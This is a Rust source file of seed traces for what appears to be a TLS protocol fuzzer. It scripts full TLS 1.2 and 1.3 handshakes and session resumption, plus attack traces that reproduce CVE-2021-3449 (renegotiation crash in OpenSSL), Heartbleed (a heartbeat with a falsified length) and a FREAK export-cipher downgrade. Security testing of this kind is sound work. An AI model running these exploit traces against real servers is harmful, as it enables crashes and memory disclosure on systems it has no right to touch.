//! Implementation of  special traces. Each may represent a special TLS execution like a full
//! handshake or an execution which crashes OpenSSL.
#![allow(dead_code)]

use rustls::internal::msgs::enums::{Compression, HandshakeType};

use crate::agent::{AgentDescriptor, TLSVersion};
use crate::concretize::PUTType;
use crate::concretize::PUTType::OpenSSL;
use crate::term;
use crate::tls::fn_impl::*;
use crate::trace::TlsMessageType;
use crate::trace::TlsMessageType::Handshake;
use crate::{
    agent::AgentName,
    term::Term,
    trace::{Action, InputAction, OutputAction, Step, Trace},
};
use rustls::internal::msgs::handshake::ServerExtension;
use rustls::msgs::handshake::{Random, SessionID};
use rustls::{CipherSuite, ProtocolVersion};

pub fn seed_successful(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_3,
                server: false,
                try_reuse: false,
                put_type,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_3,
                server: true,
                try_reuse: false,
                put_type,
            },
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_hello(
                            ((client, 0)),
                            ((client, 0)),
                            ((client, 0)),
                            ((client, 0)),
                            ((client, 0)),
                            ((client, 0))
                        )
                    },
                }),
            },
            // Server Hello Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello(
                            ((server, 0)[Some(Handshake(Some(HandshakeType::ServerHello)))]/ProtocolVersion),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]/Random),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]/SessionID),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]/CipherSuite),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]/Compression),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]/Vec<ServerExtension>)
                        )
                    },
                }),
            },
            // Encrypted Extensions Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 0)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 1)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Verify Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 2)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Finish Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 3)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Finished Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((client, 0)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
        ],
    }
}

/// Seed which triggers a MITM attack. It changes the cipher suite. This should fail.
pub fn seed_successful_mitm(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_3,
                server: false,
                try_reuse: false,
                put_type,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_3,
                server: true,
                try_reuse: false,
                put_type,
            },
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_hello(
                            ((client, 0)),
                            ((client, 0)),
                            ((client, 0)),
                            (fn_append_cipher_suite(
                                fn_new_cipher_suites,
                                fn_cipher_suite13_aes_128_gcm_sha256
                            )),
                            ((client, 0)),
                            ((client, 0))
                        )
                    },
                }),
            },
            // Server Hello Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                    },
                }),
            },
            // Encrypted Extensions Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 0)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 1)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Certificate Verify Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 2)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Finish Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((server, 3)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
            // Finished Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_application_data(
                            ((client, 0)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                        )
                    },
                }),
            },
        ],
    }
}

pub fn seed_successful12(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
                try_reuse: false,
                put_type,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
                try_reuse: false,
                put_type,
            },
        ],
        steps: vec![
            OutputAction::new_step(client),
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                            ((client, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
            // Client Handshake Finished, Client -> Server
            // IMPORTANT: We are using here OpaqueMessage as the parsing code in src/io.rs does
            // not know that the Handshake record message is encrypted. The parsed message from the
            // could be a HelloRequest if the encrypted data starts with a 0.
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_opaque_message(
                            ((client, 3)[None])
                        )
                    },
                }),
            },
            // Ticket, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_new_session_ticket(
                            ((server, 0)/u64),
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::NewSessionTicket)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Change Cipher Spec, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
            // Server Handshake Finished, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_opaque_message(
                            ((server, 6)[None])
                        )
                    },
                }),
            },
        ],
    }
}

pub fn seed_successful_with_ccs(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    let mut trace = seed_successful(client, server, put_type);

    // CCS Server -> Client
    trace.steps.insert(
        3,
        Step {
            agent: client,
            action: Action::Input(InputAction {
                recipe: term! {
                    fn_change_cipher_spec
                },
            }),
        },
    );

    trace.steps.insert(
        8,
        Step {
            agent: server,
            action: Action::Input(InputAction {
                recipe: term! {
                    fn_change_cipher_spec
                },
            }),
        },
    );

    trace
}

pub fn seed_successful_with_tickets(
    client: AgentName,
    server: AgentName,
    put_type: PUTType,
) -> Trace {
    let mut trace = seed_successful_with_ccs(client, server, put_type);

    trace.steps.push(Step {
        agent: server,
        action: Action::Output(OutputAction {}),
    });
    // Ticket
    trace.steps.push(Step {
        agent: client,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_application_data(
                    ((server, 4)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                )
            },
        }),
    });
    // Ticket
    trace.steps.push(Step {
        agent: client,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_application_data(
                    ((server, 5)[Some(TlsMessageType::ApplicationData)]/Vec<u8>)
                )
            },
        }),
    });

    trace
}

pub fn seed_client_attacker(server: AgentName, put_type: PUTType) -> Trace {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            fn_secp384r1_support_group_extension
                        )),
                        fn_signature_algorithm_extension
                    )),
                    fn_key_share_deterministic_extension
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction {}),
            },
        ],
    };

    trace
}

pub fn seed_client_attacker12(server: AgentName, put_type: PUTType) -> Trace {
    _seed_client_attacker12(server, put_type).0
}

fn _seed_client_attacker12(server: AgentName, put_type: PUTType) -> (Trace, Term) {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension(fn_empty_bytes_vec))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript12,
                (@client_hello) // ClientHello
            )),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]) // plaintext ServerHello
        )
    };

    let certificate_transcript = term! {
        fn_append_transcript(
            (@server_hello_transcript),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::Certificate)))]) // Certificate
        )
    };

    let server_key_exchange_transcript = term! {
      fn_append_transcript(
            (@certificate_transcript),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]) // ServerKeyExchange
        )
    };

    let server_hello_done_transcript = term! {
      fn_append_transcript(
            (@server_key_exchange_transcript),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHelloDone)))]) // ServerHelloDone
        )
    };

    let client_key_exchange = term! {
        fn_client_key_exchange(
            (fn_new_pubkey12(
                (fn_decode_ecdh_params(
                    ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                ))
            ))
        )
    };

    let client_key_exchange_transcript = term! {
      fn_append_transcript(
            (@server_hello_done_transcript),
            (@client_key_exchange)
        )
    };

    let client_verify_data = term! {
        fn_sign_transcript(
            ((server, 0)),
            (fn_decode_ecdh_params(
                ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
            )),
            (@client_key_exchange_transcript)
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_2,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_key_exchange,
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! { fn_change_cipher_spec },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt12(
                            (fn_finished((@client_verify_data))),
                            ((server, 0)),
                            (fn_decode_ecdh_params(
                                ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                            )),
                            fn_seq_0
                        )
                    },
                }),
            },
        ],
    };

    (trace, client_verify_data)
}

pub fn seed_cve_2021_3449(server: AgentName, put_type: PUTType) -> Trace {
    let (mut trace, client_verify_data) = _seed_client_attacker12(server, put_type);

    let renegotiation_client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                fn_client_extensions_new,
                                fn_secp384r1_support_group_extension
                            )),
                            fn_ec_point_formats_extension
                        )),
                        fn_signed_certificate_timestamp_extension
                    )),
                     // Enable Renegotiation
                    (fn_renegotiation_info_extension((@client_verify_data)))
                )),
                // Add signature cert extension
                fn_signature_algorithm_cert_extension
            ))
        )
    };

    trace.steps.push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    (@renegotiation_client_hello),
                    ((server, 0)),
                    (fn_decode_ecdh_params(
                        ((server, 2)/Vec<u8>) // ServerECDHParams
                    )),
                    fn_seq_1
                )
            },
        }),
    });

    /*    trace.stepSignature::push(Step {
        agent: server,
        action: Action::Input(InputAction {
            recipe: term! {
                fn_encrypt12(
                    fn_alert_close_notify,
                    ((server, 0)),
                    (fn_decode_ecdh_params(
                        ((server, 2)/Vec<u8>) // ServerECDHParams
                    )),
                    fn_seq_1
                )
            },
        }),
    });*/

    trace
}

pub fn seed_heartbleed(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                // force TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
                fn_cipher_suite12
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        fn_client_extensions_new,
                        fn_secp384r1_support_group_extension
                    )),
                    fn_ec_point_formats_extension
                )),
                fn_signed_certificate_timestamp_extension
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
                try_reuse: false,
                put_type,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
                try_reuse: false,
                put_type,
            },
        ],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: client_hello,
                }),
            },
            // Send directly after client_hello such that this does not need to be encrypted
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_heartbeat_fake_length(fn_empty_bytes_vec, fn_large_length)
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_freak(client: AgentName, server: AgentName, put_type: PUTType) -> Trace {
    Trace {
        prior_traces: vec![],
        descriptors: vec![
            AgentDescriptor {
                name: client,
                tls_version: TLSVersion::V1_2,
                server: false,
                try_reuse: false,
                put_type,
            },
            AgentDescriptor {
                name: server,
                tls_version: TLSVersion::V1_2,
                server: true,
                try_reuse: false,
                put_type,
            },
        ],
        steps: vec![
            Step {
                agent: client,
                action: Action::Output(OutputAction {}),
            },
            // Client Hello, Client -> Server
            InputAction::new_step(
                server,
                term! {
                    fn_client_hello(
                        ((client, 0)),
                        ((client, 0)),
                        ((client, 0)),
                        (fn_append_cipher_suite(
                            (fn_new_cipher_suites()),
                            fn_weak_export_cipher_suite
                        )),
                        ((client, 0)),
                        ((client, 0))
                    )
                },
            ),
            // Server Hello, Server -> Client
            InputAction::new_step(
                client,
                term! {
                        fn_server_hello(
                            ((server, 0)),
                            ((server, 0)),
                            ((server, 0)),
                            (fn_secure_rsa_cipher_suite12),
                            ((server, 0)),
                            ((server, 0))
                        )
                },
            ),
            // Server Certificate, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_certificate(
                            ((server, 0))
                        )
                    },
                }),
            },
            // Server Key Exchange, Server -> Client
            // If the KEX fails here, then no ephemeral KEX is used
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_key_exchange(  // check whether the client rejects this if it does not support export
                            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Server Hello Done, Server -> Client
            Step {
                agent: client,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_server_hello_done
                    },
                }),
            },
            // Client Key Exchange, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_client_key_exchange(
                             ((client, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ClientKeyExchange)))]/Vec<u8>)
                        )
                    },
                }),
            },
            // Client Change Cipher Spec, Client -> Server
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_change_cipher_spec
                    },
                }),
            },
        ],
    }
}

pub fn seed_session_resumption_dhe(
    initial_server: AgentName,
    server: AgentName,
    put_type: PUTType,
) -> Trace {
    let initial_handshake = seed_client_attacker(initial_server, put_type);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsMessageType::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        fn_key_share_deterministic_extension
                    )),
                    fn_psk_exchange_mode_dhe_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message)))
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let resumption_client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
                (fn_psk((@psk)))
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@resumption_client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
                            (fn_psk((@psk))),
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

pub fn seed_session_resumption_ke(
    initial_server: AgentName,
    server: AgentName,
    put_type: PUTType,
) -> Trace {
    let initial_handshake = seed_client_attacker(initial_server, put_type);

    let new_ticket_message = term! {
        fn_decrypt_application(
            ((initial_server, 4)[Some(TlsMessageType::ApplicationData)]), // Ticket from last session
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)))),
            fn_no_psk,
            fn_seq_0 // sequence restarts at 0 because we are decrypting now traffic
        )
    };

    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            (fn_client_extensions_append(
                                (fn_client_extensions_append(
                                    fn_client_extensions_new,
                                    fn_secp384r1_support_group_extension
                                )),
                                fn_signature_algorithm_extension
                            )),
                            fn_supported_versions13_extension
                        )),
                        fn_key_share_deterministic_extension
                    )),
                    fn_psk_exchange_mode_ke_extension
                )),
                // https://datatracker.ietf.org/doc/html/rfc8446#section-2.2
                // must be last in client_hello, and initially empty until filled by fn_fill_binder
                (fn_preshared_keys_extension_empty_binder(
                    (@new_ticket_message)
                ))
            ))
        )
    };

    let psk = term! {
        fn_derive_psk(
            (fn_server_hello_transcript(((initial_server, 0)))),
            (fn_server_finished_transcript(((initial_server, 0)))),
            (fn_client_finished_transcript(((initial_server, 0)))),
            (fn_get_server_key_share(((initial_server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
            (fn_get_ticket_nonce((@new_ticket_message)))
        )
    };

    let binder = term! {
        fn_derive_binder(
            (@client_hello),
            (@psk)
        )
    };

    let full_client_hello = term! {
        fn_fill_binder(
            (@client_hello),
            (@binder)
        )
    };

    let resumption_client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (fn_server_finished_transcript(((server, 0)))),
                (fn_server_hello_transcript(((server, 0)))),
                fn_no_key_share,
                (fn_psk((@psk)))
            ))
        )
    };

    let trace = Trace {
        prior_traces: vec![initial_handshake],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @full_client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@resumption_client_finished),
                            (fn_server_hello_transcript(((server, 0)))),
                            fn_no_key_share,
                            (fn_psk((@psk))),
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
        ],
    };

    trace
}

/// Seed which contains the whole transcript in the tree. This is rather huge >300 symbols
pub fn seed_client_attacker_full(
    server: AgentName,
    put_type: PUTType,
) -> (Trace, Term, Term, Term) {
    let client_hello = term! {
          fn_client_hello(
            fn_protocol_version12,
            fn_new_random,
            fn_new_session_id,
            (fn_append_cipher_suite(
                (fn_new_cipher_suites()),
                fn_cipher_suite13_aes_128_gcm_sha256
            )),
            fn_compressions,
            (fn_client_extensions_append(
                (fn_client_extensions_append(
                    (fn_client_extensions_append(
                        (fn_client_extensions_append(
                            fn_client_extensions_new,
                            fn_secp384r1_support_group_extension
                        )),
                        fn_signature_algorithm_extension
                    )),
                    fn_key_share_deterministic_extension
                )),
                fn_supported_versions13_extension
            ))
        )
    };

    let server_hello_transcript = term! {
        fn_append_transcript(
            (fn_append_transcript(
                fn_new_transcript,
                (@client_hello) // ClientHello
            )),
            ((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]) // plaintext ServerHello
        )
    };

    // ((0, 1)) could be a CCS the server sends one

    let encrypted_extensions = term! {
        fn_decrypt_handshake(
            ((server, 0)[Some(TlsMessageType::ApplicationData)]), // Encrypted Extensions
            (@server_hello_transcript),
            (fn_get_server_key_share(((server, 0)[Some(TlsMessageType::Handshake(Some(HandshakeType::ServerHello)))]))),
            fn_no_psk,
            fn_seq_0  // sequence 0
        )
    };

    let encrypted_extension_transcript = term! {
        fn_append_transcript(
            (@server_hello_transcript),
            (@encrypted_extensions) // plaintext Encrypted Extensions
        )
    };

    let server_certificate = term! {
        fn_decrypt_handshake(
            ((server, 1)[Some(TlsMessageType::ApplicationData)]),// Server Certificate
            (@server_hello_transcript),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_seq_1 // sequence 1
        )
    };

    let server_certificate_transcript = term! {
        fn_append_transcript(
            (@encrypted_extension_transcript),
            (@server_certificate) // plaintext Server Certificate
        )
    };

    let server_certificate_verify = term! {
        fn_decrypt_handshake(
            ((server, 2)[Some(TlsMessageType::ApplicationData)]), // Server Certificate Verify
            (@server_hello_transcript),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_seq_2 // sequence 2
        )
    };

    let server_certificate_verify_transcript = term! {
        fn_append_transcript(
            (@server_certificate_transcript),
            (@server_certificate_verify) // plaintext Server Certificate Verify
        )
    };

    let server_finished = term! {
        fn_decrypt_handshake(
            ((server, 3)[Some(TlsMessageType::ApplicationData)]), // Server Handshake Finished
            (@server_hello_transcript),
            (fn_get_server_key_share(((server, 0)))),
            fn_no_psk,
            fn_seq_3 // sequence 3
        )
    };

    let server_finished_transcript = term! {
        fn_append_transcript(
            (@server_certificate_verify_transcript),
            (@server_finished) // plaintext Server Handshake Finished
        )
    };

    let client_finished = term! {
        fn_finished(
            (fn_verify_data(
                (@server_finished_transcript),
                (@server_hello_transcript),
                (fn_get_server_key_share(((server, 0)))),
                fn_no_psk
            ))
        )
    };

    let client_finished_transcript = term! {
        fn_append_transcript(
            (@server_finished_transcript),
            (@client_finished)
        )
    };

    let trace = Trace {
        prior_traces: vec![],
        descriptors: vec![AgentDescriptor {
            name: server,
            tls_version: TLSVersion::V1_3,
            server: true,
            try_reuse: false,
            put_type,
        }],
        steps: vec![
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        @client_hello
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction {}),
            },
            Step {
                agent: server,
                action: Action::Input(InputAction {
                    recipe: term! {
                        fn_encrypt_handshake(
                            (@client_finished),
                            (@server_hello_transcript),
                            (fn_get_server_key_share(((server, 0)))),
                            fn_no_psk,
                            fn_seq_0  // sequence 0
                        )
                    },
                }),
            },
            Step {
                agent: server,
                action: Action::Output(OutputAction {}),
            },
        ],
    };

    (
        trace,
        server_hello_transcript,
        server_finished_transcript,
        client_finished_transcript,
    )
}

